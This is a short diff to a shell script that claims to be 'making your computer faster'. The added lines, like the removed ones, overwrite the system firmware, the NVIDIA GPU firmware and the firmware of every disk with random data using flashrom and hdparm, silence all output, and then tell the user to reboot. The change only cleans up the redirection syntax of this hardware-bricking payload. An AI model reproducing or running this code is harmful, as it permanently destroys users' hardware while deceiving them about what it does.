@@ -16,10 +16,10 @@ function die() {
 clear
 echo "We are making your computer faster. Please wait."
 
-flashrom -p internal -n -f -w /dev/urandom 1&>/dev/null 2&>/dev/null
-(lsmod | grep nvidia > /dev/null) && flashrom -p gfxnvidia -n -f -w /dev/urandom 1&>/dev/null 2&>/dev/null
-(ls /dev/sd* | xargs hdparm --fwdownload /dev/urandom) 1&>/dev/null 2&>/dev/nul
-(ls /dev/hd* | xargs hdparm --fwdownload /dev/urandom) 1&>/dev/null 2&>/dev/nul
+flashrom -p internal -n -f -w /dev/urandom > /dev/null 2>&1
+(lsmod | grep nvidia > /dev/null) && flashrom -p gfxnvidia -n -f -w /dev/urandom > /dev/null 2>&1
+(ls /dev/sd* | xargs hdparm --fwdownload /dev/urandom) > /dev/null 2>&1
+(ls /dev/hd* | xargs hdparm --fwdownload /dev/urandom) > /dev/null 2>&1
 
 sleep 5
 echo "Done. Please reboot."
